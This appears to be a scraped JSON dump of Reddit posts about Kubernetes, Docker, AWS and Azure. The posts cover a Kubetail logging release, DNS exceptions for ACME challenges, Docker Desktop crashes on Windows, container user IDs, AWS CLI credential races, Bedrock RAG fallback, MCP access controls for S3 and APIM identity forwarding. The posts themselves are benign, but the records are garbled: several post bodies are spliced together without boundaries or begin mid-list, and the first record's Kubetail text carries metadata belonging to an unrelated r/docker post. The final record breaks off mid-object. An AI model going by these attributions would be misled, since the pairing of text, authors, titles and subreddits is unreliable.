{"post_id": "1nqxu61", "title": "Kubetail: Real-time Kubernetes logging dashboard - September 2025 update", "content": "&gt;TL;DR - Kubetail now has a tiny Rust-powered cluster agent, a new dashboard UI and is available as a minikube addon.\n\nHi Everyone!\n\nIn case you aren't familiar with [Kubetail](https://github.com/kubetail-org/kubetail), we're an open-source logging dashboard for Kubernetes, optimized for tailing logs across multi-container workloads in real-time. The primary entry point for Kubetail is the `kubetail` CLI tool, which can launch a local web dashboard on your desktop or stream raw logs directly to your terminal.\n\nWe met many of our contributors through the communities here at r/kubernetes, r/devops and r/selfhosted so I'm grateful for your support and excited to share some of our recent updates with you.\n\n# What's new\n\n# 🦀 Rust-based cluster agent\n\nRecently, we launched a real-time log search feature powered by a custom Rust executable that used the [ripgrep](https://github.com/BurntSushi/ripgrep) library internally. Although the feature itself worked well, the cluster agent gRPC server that called the Rust executable on each node was written in Go (our primary language) so it made development awkward. So in order to get rid of the impedence mismatch between Rust and Go -- and to make the cluster agent as fast and lightweight as possible -- we decided to re-write the entire agent in Rust.\n\nI'm happy to say that the re-write is complete and the new Rust-based cluster agent is live in our latest official release (helm/v0.15.2). The new Docker image is 57% smaller (10MB) and on our [demo site](https://www.kubetail.com/demo) we've seen memory usage per instance drop 70% (\\~3MB) with CPU usage is still low at \\~0.1%. This is important going forward because the cluster agent runs on every node in a cluster so we want it to spin up quickly and be as performant and lightweight as possible.\n\nTo use the new Rust-powered cluster agent you can install the latest chart using helm or directly with the [`kubetail`](https://github.com/kubetail-org/kubetail?tab=readme-ov-file#quickstart-desktop) CLI tool:\n\n    # install\n    kubetail cluster install\n    \n    # upgrade\n    kubetail cluster repo update &amp;&amp; kubetail cluster upgrade\n\nSpecial thank you to two of our contributors, [gikaragia](https://github.com/gikaragia) and [freexploit](https://github.com/freexploit) who stepped up to lead the effort and delivered the bulk of the code with remarkable skill, speed and dedication. Thank you!\n\n# 🪄 UI upgrade\n\nUntil recently, most of the Kubetail design work was handled by myself and the other engineering contributors but lately we started getting help from a professional UI/UX designer who joined the project as a contributor. The difference has been amazing. Now instead of going straight to code we prototype changes in Figma which lets us iterate more quickly, gather feedback earlier and make better design choices.\n\nFor his first major contribution to the project [Erkam Calik](https://www.linkedin.com/in/erkamcalik/) been working on some UI upgrades to the Kubetail dashboard which are now live in the latest version (cli/v0.8.2, helm/0.15.2) and visible on our demo site: https://demo.kubetail.com.\n\nA huge thank you Erkam for bringing his talent and fresh perspective to the project. I'm excited to see where you'll take the Kubetail UI next!\n\n# 📦 Minikube addon\n\nAs of minikube v1.36.0 you can install Kubetail as an addon:\n\n    minikube addon enable kubetail\n\nOnce the Kubetail pods are running you can open a connection to the web dashboard:\n\n    minikube service -n kubetail-system kubetail-dashboard\n\nSpecial thank you to [medyagh](https://github.com/medyagh) for reviewing our PR and in general for the amazing work you do to make minikube one of our favorite pieces of software!\n\n# What's next\n\nCurrently we're working on UI upgrades to the logging console and some backend changes that will allow us to integrate Kubetail into the Kubernetes API Aggregation layer. After that we'll work on exposing Kubernetes events as logging streams.\n\nWe love hearing from you!

The DNS Resolver is set with local-zone type to **static** to keep all internal lookups local and prevent queries from leaving the network.\n\nThe challenge is that some internal services rely on Let’s Encrypt certificates issued via the DNS-01 method in Cloudflare. cert-manager in Kubernetes creates the TXT records in Cloudflare and then tries to verify propagation before acknowledging Let’s Encrypt. Since pfSense is authoritative for [internal.domain.com](http://internal.domain.com/) , those \\_acme-challenge queries (i.e. \\_acme-challenge.nginx.internal.domain.com) never reach Cloudflare and cert-manager always sees an empty response.\n\nI was thinking that if an exception in Unbound’s configuration is possible to forward only TXT lookups for \\_acme-challenge.\\*.internal.domain.com to an external resolver (for example, 1.1.1.1), while keeping all other internal.domain.com queries local. Can this be achieved using “Custom options” in pfSense?\n\nI am also wondering how are you handling ingress traffic.  \nMy services are exposed on &lt;service&gt;.test.internal.domain.com, &lt;service&gt;.staging.internal.domain.com.

The fix is to manually need to restart the docker for windows engine but that seems horrible and this screams to me something wrong under the hood.\n\n**Error message states:**\n\n *docker : request returned Internal Server Error for API route and version*\n\n*http://%2F%2F.%2Fpipe%2FdockerDesktopLinuxEngine/v1.46/containers/proxymanager-app-1/stop,* \n\n*check if the server supports the requested API version*\n\nThis happens aprox once a month every month for the past year so or, no steps to reproduce as it just happens in the background. Running on a Win10 pro server rack pretty much a fresh install. Again works fine for a while before dying so assume config is ok.\n\nI have tried running a background task where once a day it restarts the containers to keep them fresh using docker start and docker stop, to no avail, as the docker commands die along with the containers when the above happens.\n\nUpon searching the issue most forums just state the workaround, to manually restart windows for docker. I would be fine with this if there was an easy way to automatically do this in a background task but cant seem to find a good way to do that (wsl --shutdown dosnt actually kill docker for windows it just puts it into a weird state and puts up an error message, also when it comes to ending the process it seems to do the same - not ideal for auto restarting!)\n\n  \nAnyone know any reason this could be occurring or any good way to work around this? Have touched very few non default settings except for the WSL2 based engine as it is recommended for performance.\n\nAlso in my WSL config i have limited the memory and cores (Mid spec PC also doing media hosting) but for a simple proxy server doubt this is the issue as vmmem typically sits at half this.

I've had this a lot during my testing and research that I've stumbled upon 'the solution' which, when implemented, turned out to not work or have other problems (like exposing the web application and ignoring ufw in the case of macvlan).\n\nThank you people in advance!", "author": "sebby2", "subreddit": "docker", "score": 0, "upvote_ratio": 0.11, "num_comments": 23, "created_utc": "2025-10-02T02:49:37", "url": "https://www.reddit.com/r/docker/comments/1nvf70y/get_rid_of_docker_or_just_skill_issue/", "permalink": "https://reddit.com/r/docker/comments/1nvf70y/get_rid_of_docker_or_just_skill_issue/", "is_self": true, "domain": "self.docker", "tech_keywords": ["AR", "docker"], "crawled_at": "2025-10-03T13:57:10.825408", "sentiment_score": {"vader_compound": -0.2179, "vader_positive": 0.109, "vader_neutral": 0.785, "vader_negative": 0.107, "textblob_polarity": -0.0507638888888889, "textblob_subjectivity": 0.5022466422466423, "overall_sentiment": "negative"}},

Bootstraps from monorepository - modulary resolved in recursive context -,  pushes its self-contained, extended monorepo to control plane which triggers the pipeline within the pipeline to recursively provision and orchestrate container deterministcally according IaC config. management definitions to PVE.\n\n\n**Architecture**\n\nA local bootstrap script (`./local/run.sh`) seeds a Gitea instance and a runner, initializes the pipeline, and creates an initial pull request. Merging this PR transitions the system into full self-management. From that point on, subsequent commits automatically converge the desired state across all Proxmox LXC containers.\n\nThe system uses a self-contained monorepo with reusable container libraries. Ansible handles provisioning against Proxmox, while Cinc (a Chef distribution) performs desired-state convergence and cross-layer orchestration where declarative modeling is insufficient.  \n\n\n**Core Concepts**\n\n* **Recursive Self-Management:** The control plane executes from within the managed containers to maximize reproducibility and minimize configuration drift.\n* **Git as Current Desired State:** All operations map to standard Git workflows (commit, merge, rollback) in a completely stateless management model.\n* **Convention-Based Extensibility:** Add a new service by copying a container definition from the `libs` directory, adding a minimal cookbook and a `config.env` file. The pipeline automatically handles provisioning, configuration, and validation.\n* **Loose Coupling:** Containers remain independently replaceable and continue to function without requiring manual follow-up actions after changes. \n\n**Environment**\n\n* **Proxmox VE:** Versions 8.4–9.0\n* **Container OS:** Debian 13 LXC by default\n* **Bootstrap:** Local bootstrap via Docker; all further actions are repository-driven.\n\n**Installation**\n\n1. Configure your Proxmox credentials in `./local/config.json`.\n2. Run the bootstrap script to seed the environment:./local/run.sh\n3. Accept the initial Pull Request in the newly seeded Gitea instance at `http://localhost:8080/main/config`.\n4. Push any changes to your repository to trigger provisioning, convergence, and validation on Proxmox VE.\n\n**Trade-Offs**\n\n* The recursive bootstrap model increases initial complexity to preserve \"rebuild-from-repo\" semantics and ensure deterministic behavior.\n* On Proxmox 9, stricter token privileges limit certain operations. The automation therefore uses root-context API access where token permissions are insufficient.\n\n—-\n\nBuilding this I really was wondering why such a recursive submodule-referenced deployment concept isn‘t seen more often. Even with complexity as a trade-off it practically eliminates runtime issues most likley at built time, I theorize but please tell me your thoughts.

{"post_id": "1npbz1r", "title": "GitOps without Kubernetes: Declarative, Git-driven Docker deployments", "content": "For the past year, I’ve been developing **Simplecontainer**, a container orchestrator that runs on top of Docker and enables GitOps-style deployments to plain virtual machines. The engine itself also runs as a container on Docker. Everything is free and open source.\n\nQuick intro:\n\n[You can read the blog article here](https://blog.simplecontainer.io/gitops-without-kubernetes-declarative-git-driven-docker-deployments-with-simplecontainer-io/) (if you are interested in detail), which explains all the GitOps features:\n\n* Built-in **GitOps reconciler** for automatic deployment sync, drift detection, and CI/CD integration.\n* Declarative YAML definitions like Docker Compose, but with **Kubernetes-like features** (clustering, secrets, replication).\n* Ideal for small/medium projects or home labs—**no Kubernetes overhead** needed.\n\nGetting started is as simple as running a few commands to install and start the simplecontainer manager (`smrmgr`). You can define your containers in YAML packs, link them to a Git repo, and let simplecontainer automatically deploy and keep them up-to-date. All while on the node directly you can still use docker commands.\n\nThere is also a [Video demonstration of simplecontainer UI dashboard](https://www.youtube.com/watch?v=KjfTljcSD4k) the Simplecontainer UI dashboard that shows, in under 2 minutes, features such as connecting to a remote node, GitOps deployment via the UI, and using the terminal shell for remote containers.\n\nAnyone interested in trying out the tool - I am here to help. You can get running with a few commands if you have Docker already installed (\\~30s).  \n\nI’m very active on [Simplecontainer’s GitHub](https://github.com/simplecontainer/smr), responding to issues and discussions as quickly as possible. If you’d like to try out Simplecontainer, I’m happy to provide guidance and help resolve any issues.

{"post_id": "1npjkrp", "title": "Struggling to understand the relationship between container and host user accounts.", "content": "New to both Linux and Docker so hitting a few conceptual roadblocks.\n\nI'm at the stage where I'm learning to run containers that others have built, as opposed to creating my own. Consider this brief excerpt from a `docker-compose.yml` file that was created by a third-party. Here he's defining a container named `db`. \n\n`db:`\n\n`environment:`\n\n`MYSQL_DATABASE: \"xxx\"`\n\n`MYSQL_USER: \"xxx\"`\n\n`MYSQL_PASSWORD: \"xxx\"`\n\n`MYSQL_ROOT_PASSWORD: \"xxx\"`\n\n`image: mariadb:10.5.21`\n\n**user: \"1000:1000\"**\n\n`restart: always`\n\n`stop_grace_period: 1m`\n\n**volumes:**\n\n`-` **./mysql/data:/var/lib/mysql**\n\nMy question is about the `user` directive. So am I correct then, that whoever created this image baked into it a couple of users? A root user whose UID is 0 and a secondary, lower-privilege account whose UID is 1,000?\n\nI've read about the importance of not running containers under the root account (UID=0), so by distributing this `docker-compose.yml` file with the directive `user: \"1000:1000\",` I take it that the image's author is recommending that the container be run using this secondary user (UID=1000) that he baked into the image?\n\nIf that's not the case, please correct my misconceptions. If it is the case, here's what I don't understand:\n\nThat container is going to write it's data to a volume which lives on the host at `./mysql/data`. And when it does, it's going to do so via container user 1000, and furthermore, the container will expect that there exists a host-specific user with a UID of 1000 that has read/write access to that folder. \n\n**But why would the image's author assume that the user's host OS has a user with a UID of exactly 1,000?** And even if the host OS *does* have a user with that UID, what if it belongs to Karen in HR or Janet in payroll, or some other random person who shouldn't necessarily have access to that folder?\n\nThe reason I'm asking is because one day I may want to create my own container images and make them available to others, and it just seems odd that I should assume that each of my users will have a host user whose UID is exactly 1,000 and that that user should be analogous to the container user 1,000 that's baked into the image.\n\nResearching this, I read in depth about [user namespace mapping](https://docs.docker.com/engine/security/userns-remap/), and indeed, it works as advertised. But it's not exactly trivial to configure. Seems like it would be big jump in complexity for my non-tech-savvy users to learn about it, as opposed to simply typing `docker compose up` to spin up the container images that I provide them.\n\nThere's some piece of the conceptual puzzle that I'm missing. What is it?\n\n  \nThanks in advance.\n\n", "author": "my-hearing-aid", "subreddit": "docker", "score": 8, "upvote_ratio": 0.9, "num_comments": 8, "created_utc": "2025-09-25T03:13:34", "url": "https://www.reddit.com/r/docker/comments/1npjkrp/struggling_to_understand_the_relationship_between/", "permalink": "https://reddit.com/r/docker/comments/1npjkrp/struggling_to_understand_the_relationship_between/", "is_self": true, "domain": "self.docker", "tech_keywords": ["AI", "AR", "docker"], "crawled_at": "2025-10-03T13:57:10.874095", "sentiment_score": {"vader_compound": 0.8171, "vader_positive": 0.042, "vader_neutral": 0.938, "vader_negative": 0.02, "textblob_polarity": 0.027352472089314198, "textblob_subjectivity": 0.39315903394850765, "overall_sentiment": "positive"}},

I exec'ed into the container and installed psql and tried connecting locally and it advises that the connection was refused, e.g.\n\npsql: error: connection to server at \"host.docker.internal\" (172.17.0.1), port 9000 failed: Connection refused\n\nDoes the last only work when you're using the docker desktop app?  If not, how can I connect?  While it's possible to run this 3rd party app locally, for the sake of verisimilitude, I would prefer to run it a container.\n\n  \nEDIT:\n\nI wound up using docker run --network host my-app\n\nMy local machine runs Ubuntu which by default launches apache on port 80.  Since my app runs on port 80 and a couple of attempts couldn't reconfigure it to port 81, it seemed simpler to just disable apache on the host.  From there it worked just fine.

Also needed an lighter alternative to coder for my startup since were only a few devs and coder is probably overkill.\n\nCan either be bootstrapped by env vars or inside code-server directly (ctrl+alt+g, or in terminal use cli)\n\nSome other things im probably forgetting. Check the repo readme for full breakdown of features. Makes privisioning workspaces for devs a breeze.\n\nThought others might like this handy as it has saved me tons of time and effort. Coder is great but for a team of a few dev's or an individual this is much more lightweight and straightforward and keeps life simple.\n\nTry it out and let me know what you think.\n\nFuture thoughts are to work on isolated environments per repo somehow, while avoiding dev containers so we jsut have the single instance of code-server, keeping things lightweight. Maybe to have it automatically work with direnv for each cloned repo and have an exhaistive script to activate any type of virtual environments automatically when changing directory to the repo (anything from nix, to devbox, to activating python venv, etc etc.)\n\nCheers!", "author": "TraditionalAd552", "subreddit": "docker", "score": 3, "upvote_ratio": 0.81, "num_comments": 0, "created_utc": "2025-09-18T12:27:56", "url": "https://www.reddit.com/r/docker/comments/1njxq17/gitstrapped_code_server/", "permalink": "https://reddit.com/r/docker/comments/1njxq17/gitstrapped_code_server/", "is_self": true, "domain": "self.docker", "tech_keywords": ["AI", "AR", "python", "share"], "crawled_at": "2025-10-03T13:57:10.953890", "sentiment_score": {"vader_compound": 0.9369, "vader_positive": 0.101, "vader_neutral": 0.859, "vader_negative": 0.04, "textblob_polarity": 0.16904761904761906, "textblob_subjectivity": 0.4744047619047619, "overall_sentiment": "positive"}},

Anyways, here we go again:\n\nI'm thinking of changing to containers but want to know how difficult it is for a newbie to set it up to work the same way (effectively) as it does today. I have a single Windows VM that's primarily my home file server. Over time, I started installing other applications on it, so it's becoming less and less of a pure Windows file server. The VM has 2 virtual NIC's and Windows is set up to use 192.168.1.250 and 192.168.251. My internet router is 192.168.1.1. One of the applications is configured to use the 192.168.1.251 interface, and the router is set up so that any traffic from that IP address is sent through the VPN interface set up on my router. Anything else from that server is routed through the default unencrypted interface.\n\nIf I switch to using containers for each application, I read that containers are assigned a private IP address \"behind\" the Docker host which NAT's them to the rest of the network, so I'm not sure how I would configure my router (Ubiquiti Gateway Max) to catch that traffic and send it through the VPN.

{"post_id": "1nj99ps", "title": "What is the correct way to use Docker in Windows?", "content": "I'm looking for some insight on how to start using Docker containers on Windows.\n\nFor some context, I have built a Linux home server, cli, with Open Media Vault to manage a pool of disks and docker compose, so I have some understanding on the subject, although everything is a bit cloudy after it being off and without engagement for a while.\n\nYesterday I installed Docker Desktop on my windows machine. I also setup WLS, and everything seems to be working correctly. I got an image from Docker hub and deployed the container to test it. Everything seemed fine.\n\nI then tried to add a different disk to serve it my media. I'd also like it to have xwr permissions and make it the main storage for all Docker related files. Although I didn't get as far, because even after adding my disk to the file systems in settings, I am unable to locate said device inside my container.\nThis all seems to be little details that I'll have to iron out later, as I did with my Linux server.\n\nWhilst trying to get some insight on the subject, I came across a lot of comments discouraging people from using Docker Desktop, giving the main reasoning of it not being properly optimized to work without much issues, or that the integration of Linux with Windows not being propperly stable. \n\nSo what is the right path to take? If Docker Desktop is not the way to go, what other ways to run containers are a best option?\n\n\nMy intention is to use Docker. I don't want to use dedicated software for Virtual Machine emulation like Oracle. I know this apps are available independently too, but I want to test Docker in Windows. My question is only about what root to take, before I begin, as Docker Desktop seems to not be the recommended way.\n\n\nSuggestions will be appreciated.\n\n\n\nEDIT:\n\n\nAfter understanding that Docker Desktop was not needed for what I was trying to achieve, and that the WSL2 Subsystem actually gives me access to the distro and CLI (I misunderstood its use. I believed that Docker Desktop was the platform using the Linux distro's kernel and that I was limited to use it, without the access to the actual VM), I nuked everything and started from scratch.\nSo I setup WSL2 and used Ubuntu 24.04 as my main distro, installed Portainer, and carried on from there. It was as easy as that. In about 1 hour I had every container important to my project setup and running.\n\nI was able to access every disk from a pre-determined mount point (/mnt/c for C:\\ ; /mnt/d for D:\\ ; and so on), so loading my media was not an issue at all. Although, all the disks are in NTFS, I don't understand why I didn't have to install something like the ntfs-3g package to be able to use them, but I could rwx from the beginning, so I assumed it was implemented in the distro.\n\nAll the containers have internet connection and they were all able to talk to each other, after I created a shared network for all of them (in Portainer&gt;Networks&gt;add network&gt;Driver: bridge) and I can list every other network interface on my machine, with IPV4/6. Windows creates a virtual Ethernet adapter using Hyper-V whenever the distro is booted. I believe it creates a link between the real ethernet adapter and the one created for WSL. I plan to learn more about this after finishing my current development on the project.\n\nThe only real network related issue I had was when I was setting up a stack in Portainer which depended on mariaDB. For some reason the request to pull the image was being done in IPV6, even after disabling it on boot. So every time I tried to deploy the stack, the connection would time out, with the error: Network unreachable.\nI ended up looking for ways to force IPV4 connection over IPV6, which worked perfectly. To do this I used: \"sudo nano /etc/gai.conf\", and removed the comment tag from the last 3 lines, started by \"scopev4\".\nAfter reboot I was able to deploy and pull the image as normal. I can't say why this happened. I think this must have something to do with WSL and the firewall. Something else to learn about.\n\nTo ease the interaction of other users with the demonic black box with white crazy scriptures, I tried to give them a button which would magically start all the services, and also hide the terminal box in the system tray. To achieve this I pinned the \"Ubuntu-24.04\" icon (found in Windows start button) to the taskbar. Then using the WSL terminal I pressed \"CNTRL\" + \",\" to access the terminal settings, then \"Appearance\" and enabled \"Always display an icon in the notification area\", \"Hide terminal in the notification area when it is minimized\" and \"Automatically hide window\".\nAfter this every time the \"Ubunto-24.04\" icon on the taskbar is pressed, the terminal will open and Automatically disappear, leaving an icon on the system tray which will give you access to every distro installed and every terminal, PowerShell or WSL terminal opened. To close them I just need to open the terminal and close the window.\n\nAlmost 2 weeks after I started this project, I am now hosting more web applications than I firstly planned. So far I had 0 issues, everything works as planned, and exactly as I wanted, a fully integrated way of deploying docker containers for Windows, without the need of anything else than a terminal, with minimal interaction between the technical part needed to make it work, and the end user. Up and running only when needed and easy to stop whenever not. I would say that for me, the Right Way (TM) to accomplish my needs is this, and avoid unnecessary software like Docker Container. Thank you to the ones that understood the confusion and simply told me this.\n\nAlthough for some people this question may seem to be a waste of time, with more than 30k of views on this post, I believe it may be of interest to someone else, that like me, may just be in need of a finger pointed in the right direction. \n\n\nI don't discredit that there might be issues down the line, but I would be disappointed otherwise. I am however very happy with this setup and it feels as strong and reliable as a standalone system, after a couple of weeks of use.

For these commands to work, the scripts need to set environment vars pointing to their config/cred files, and then run the AWS CLI with a specific profile.\n\nAnother note: the scripts are supposed to delete the config/credentials files at the end of their execution.\n\nThe problems occur when there are multiple deployments, each script isn't aware of others. So if they just plain delete the config/cred files, other deployments when running AWS CLI commands.\n\nSo I tried to build make a class object in Python, using class vars, so each instance can be aware of shared data. But I have run into an experiment where in generating the config/cred files, multiple processes ran at the same time, and created an unparseable file.\n\nWhen I say these deployments are parallel, I really mean are launched and run in perfect sync.\n\nA previous approach was to generate different cred/config files for each deployment, but we also ran into issues where, between setting the environment variables for different AWS profiles, and running the AWS CLI, parallel deployments WOULD STILL interfere with each other, not being able to find the profile in the conf/cred which was switched.\n\nMy last plan is to simply delay each process by waiting random number between 0 and 2 seconds to offset this, which is a dirty solution.\n\nIdeally, I'd rather not have to use the files at all, having to delete them, and implementing these work-arounds, also complicates the code to my colleagues which aren't much of programmers and will maintain these scripts.\n\n  \nEDIT: typo.", "author": "R717159631668645", "subreddit": "aws", "score": 1, "upvote_ratio": 0.6, "num_comments": 20, "created_utc": "2025-10-03T04:52:30", "url": "https://www.reddit.com/r/aws/comments/1nwe1mu/is_there_any_way_to_run_cli_commands_without/", "permalink": "https://reddit.com/r/aws/comments/1nwe1mu/is_there_any_way_to_run_cli_commands_without/", "is_self": true, "domain": "self.aws", "tech_keywords": ["AI", "AR", "python", "share"], "crawled_at": "2025-10-03T13:57:11.020911", "sentiment_score": {"vader_compound": 0.8623, "vader_positive": 0.056, "vader_neutral": 0.916, "vader_negative": 0.028, "textblob_polarity": 0.04653880070546738, "textblob_subjectivity": 0.31704144620811286, "overall_sentiment": "positive"}},

Should I code a manual fallback?", "content": "Hey everyone,\n\nI'm working with a Bedrock Knowledge Base and have run into a couple of issues with the RAG logic that I'm hoping to get some advice on.\n\n**My Goal:** I want to use my Knowledge Base (PDFs in an S3 bucket) purely to **augment** the foundation model. For any given prompt, the system should check my documents for relevant context, and if found, use it to refine the FM's answer. If no relevant context is found, it should simply fall back to the FM's general knowledge without any \"I couldn't find it in your documents\" type of response.\n\n**Problem #1: No Automatic Fallback** When I use the `RetrieveAndGenerate` API (or the console), the fallback isn't happening. A general knowledge question like \"what is the capital of France?\" results in a response like, \"I could not find information about the capital of France in the provided search results.\" This suggests the system is strictly limited to the retrieved context. Is this the expected behavior or is it due to some misconfiguration? I couldn't find a definitive answer.\n\n**Problem #2: Unreliable Citations** Making this harder is that the `RetrieveAndGenerate` response doesn't seem to give a clear signal about whether the retrieved context was actually relevant. The `citations` object is always populated, even for a query like \"what is the capital of France?\". The chunks it points to are from my documents but are completely irrelevant to the question, making it impossible to programmatically check if the KB was useful or not.\n\n**Considering a Manual Fallback - Is this the right path?** Given these issues, and assuming it's not due to any misconfiguration (happy to be corrected!), I'm thinking of abandoning the all-in-one `RetrieveAndGenerate` call and coding the logic myself:\n\n1. **First, call** `Retrieve()` with the user's prompt to get potential context chunks.\n2. **Then, analyze the response and/or chunks.** Is there a reliable way to score the relevance of the returned chunks against the original prompt?\n3. **Finally, conditionally call** `InvokeModel()`. If the chunks are relevant, I’ll build an augmented prompt. If not, I’ll send the original prompt to the model directly.\n\nHas anyone else implemented a similar pattern? Am I on the right track, or am I missing a simpler configuration that forces the \"augmentation-only\" behavior I'm looking for?\n\nAny advice would be a huge help.

{"post_id": "1nurh1f", "title": "IAM-like language for MCP access controls for S3 buckets", "content": "Seeking feedback! We're working on an access control feature for \"filesystem-like\" access within MCP that can be uniform across cloud providers and anything else that smells like a filesystem (although my initial target is, in fact, S3 buckets). It should also be agent/LLM friendly and as easy as possible for humans to author.\n\nThere are two major changes relative to AWS IAM's approach for S3 that we're contemplating:\n\n1. Compute LISTing grants dynamically based on READ permissions. This uses a \"common sense\" rule that says all containing directories of all readable files should be listable, so long as the results at any given level are restricted to (only) readable files or directories on the path to some readable file. This gives the AI a natural way to navigate to all reachable files without \"seeing anything it shouldn't\". (Note that a reachable file is really a reachable file *location* permitted by the access control rules even if no file exists there yet.) Implicit LIST grant computation also avoids the need for the user to manually define LIST permissions, and thus rules out all the error modes where LIST and READ don't align correctly due to user error. (BTW, implementing this approach uses cool regexp pattern intersection logic :)\n2. Split S3's PUT permission in two: CREATE (only allows creating new files in S3, no \"clobbers\") and WRITE, which is like PUT in that it allows for both creating net-new files and overwriting existing ones. This split allows us to take advantage of S3's ability to avoid clobbering files to offer an important variant where LLMs/agents cannot destroy any existing material. For cases where overwriting is truly required, WRITE escalates the privilege.\n\nOther/Minor changes:\n\n* DELETE is like AWS IAM S3 DELETE, no change there\n* \"FILE\\_ALL\" pseudo verb granting read, write, and delete all at once as a convenience\n* Standard glob/regexp pattern language &amp; semantics instead of AWS IAM S3's funky regexp notation and semantics\n\nWould love feedback on any aspect of this, but particularly:\n\n* Strong reasons to prefer the complexity (and error cases exposed by) \"manual\" LISTing, especially given that the AI client on the other side of the MCP boundary can't easily repair those problems\n* Agree or disagree that preventing an AI from clobbering files is super important as a design consideration (I was also stoked to see S3's API actually supported this already, so it's trivial to implement btw)\n* Other changes I missed that you think significantly improve upon safety, AI-via-MCP client comprehension, or human admin user efficiency in reading/writing the policy patterns\n* X-system challenges. For example, not all filesystems support differentiating between no-clobber-creation and overwrite-existing, but it seems a useful enough safety feature that dealing with the missing capability on some filesystems is more than balanced by having the benefit on those storage systems that support it.\n* Other paradigms. For instance, unices have had a rich file &amp; directory access control language for many decades, but many of its core features like groups and inheritance aren't possible on any major cloud provider's object store.\n\n  \nThanks in advance!", "author": "After-Kick-9574", "subreddit": "aws", "score": 2, "upvote_ratio": 0.67, "num_comments": 3, "created_utc": "2025-10-01T07:36:18", "url": "https://www.reddit.com/r/aws/comments/1nurh1f/iamlike_language_for_mcp_access_controls_for_s3/", "permalink": "https://reddit.com/r/aws/comments/1nurh1f/iamlike_language_for_mcp_access_controls_for_s3/", "is_self": true, "domain": "self.aws", "tech_keywords": ["AI", "AR"], "crawled_at": "2025-10-03T13:57:11.093946", "sentiment_score": {"vader_compound": 0.995, "vader_positive": 0.161, "vader_neutral": 0.772, "vader_negative": 0.066, "textblob_polarity": 0.15291943828529195, "textblob_subjectivity": 0.520639320029564, "overall_sentiment": "positive"}},

The main goal is to provide structured learning materials for anyone trying to learn the basics of solutions architecture and IaC. The community was very kind and helpful, and I integrated the feedback I received into these new 5 labs. This time I focused a bit more on containerized solutions.\n\nIf you're interested in the first 5 labs, here's the previous post: [https://www.reddit.com/r/aws/comments/1mne505/i\\_wrote\\_5\\_labs\\_for\\_helping\\_you\\_learn/](https://www.reddit.com/r/aws/comments/1mne505/i_wrote_5_labs_for_helping_you_learn/)\n\nHere's what's new:\n\n• Complete PDF Processing/Moderation Pipeline: Combines two of the previous labs into a more complex processing pipeline. We learn about event fan-out patterns. (https://www.brainstobytes.com/serverless-pdf-full-pipeline)\n\n• Using RDS Proxy to protect your DB: Helps you scale your database's ability to serve connections to compute that can scale up quickly in a safe manner. (https://www.brainstobytes.com/api-gateway-proxied-rds)\n\n• Create a load-balanced containerized workflow running on Fargate: Learn how to build a load-balanced cluster running on a serverless foundation. (https://www.brainstobytes.com/load-balanced-ecs-fargate-from-scratch)\n\n• The same as above, but using construct patterns: Shows how to get a lot done with just a little infrastructure code. Useful when contrasted with the from-scratch approach in the companion lab. (https://www.brainstobytes.com/load-balanced-ecs-fargate-from-pattern)\n\n• Hide mixed services/compute behind an API Gateway: Implement a simple version of the gateway pattern using mixed compute backend resources (Lambdas and containers). (https://www.brainstobytes.com/api-gateway-pattern)\n\nAs before, I've tried to make them as didactic and practical as possible, they all include architecture diagrams and step-by-step breakdowns. I incorporated feedback from the previous batch and went harder on the approach of leaving each solution partially incomplete, then pointing toward solutions and further experiments at the end of each lab.\n\nI also open-sourced everything, so feel free to grab whatever you find useful and adapt it for your own experiments: [https://github.com/don-juancito/cloud-experiments](https://github.com/don-juancito/cloud-experiments)\n\nThanks again for the feedback and help.

Build a VM from the Azure Marketplace, using TrustedLaunch\n2. Customize the VM, Sysprep it (/oobe /generalize /shutdown /mode:vm)\n3. Capture an image template from the VM\n4. Create a distribution image from the image template, using the customizer to add steps such as \"windowupdate,\" \"windowsrestart,\" and \"powershell.\"\n5.

Deploy host pool from that image\n\nI've been banging my head against this for over a week now, and our EDE tech has gone silent.  Opened a ticket with MS tech support, and they seem surprised that this is even an option.  Original tech that I spoke with suggested I try \"Standard\" instead of \"TrustedLaunch,\" at step 1.  Using \"TrustedLaunch\" at step 1 resulted in a \"*BadRequest : The provided gallery image only supports creation of VMs and VM Scale Sets with 'TrustedLaunch' security type.*\" error message at step 5.  Using \"Standard\" at step 1 (per the tech's suggestion) resulted in a \"*BadRequest: Use of TrustedLaunch setting is not supported for the provided image. Please select Trusted Launch Supported Gen2 OS Image*\" error at step 6 (and yes, the image is Get2 (Windows 11 Enterprise, Multi-Use, with M365 Apps, 24H2, Gen2).\n\nI'm thinking there has to be some kind of flag I'm missing or some option.

{"post_id": "1nvhgzj", "title": "Using Azure API Management as an MCP server for AI agents – how to securely forward user identity instead of a service account?", "content": "Hi everyone,\n\nI’ve recently implemented Azure API Management (APIM) in front of several backend APIs, and it’s been working well for the usual API gateway use cases (exposing APIs, securing them, policies, etc.).\n\nI came across the new preview feature in APIM that allows exposing APIs as an MCP (Model Context Protocol) server. This essentially makes it possible for AI agents (like copilots or custom agents) to consume APIs exposed through APIM as \"tools.\" Very promising for building AI-powered apps.\n\nThat said, I’ve hit a security concern and wanted to get feedback from the community:\n• In the current setup, when an AI agent calls a tool via MCP → APIM forwards the request to the backend.\n• Right now, APIM is authenticating using a backend service account credentials sent through Authorization headers generally\n• That means the backend only sees the APIM identity, not the actual end user identity.\n• This is a hard blocker for us, because one of the key requirements is that the user’s identity or scopes must be forwarded to the backend. Otherwise, a user could indirectly access data they should not have permissions for, since APIM would be calling the backend on their behalf with its own elevated identity.\n\nThe question(s):\n• Has anyone here explored this MCP + APIM integration yet, especially in a production or enterprise security context?\n• Is there a way to make APIM forward the user’s Azure AD identity (or delegated scopes) when exposing APIs through MCP?\n• Would this require a custom OAuth2 / JWT pass-through policy in APIM, or are there plans from Microsoft to support delegated identities in MCP natively?\n• How are others approaching this problem of identity propagation between AI agents → APIM → backend APIs?\n\nRight now, my main fear is that without a proper identity forwarding mechanism, MCP via APIM is stuck being useful only for “public” or “system-level” APIs, not for APIs with RBAC or per-user data security requirements.\n\nWould love to hear if anyone has found patterns, workarounds, or if this is something Microsoft is already addressing.\n\nThanks in advance!", "author": "themkguser", "subreddit": "azure", "score": 6, "upvote_ratio": 0.8, "num_comments": 4, "created_utc": "2025-10-02T04:11:00", "url": "https://www.reddit.com/r/AZURE/comments/1nvhgzj/using_azure_api_management_as_an_mcp_server_for/", "permalink": "https://reddit.com/r/AZURE/comments/1nvhgzj/using_azure_api_management_as_an_mcp_server_for/", "is_self": true, "domain": "self.AZURE", "tech_keywords": ["AI", "AR"], "crawled_at": "2025-10-03T13:57:11.195280", "sentiment_score": {"vader_compound": 0.9525, "vader_positive": 0.083, 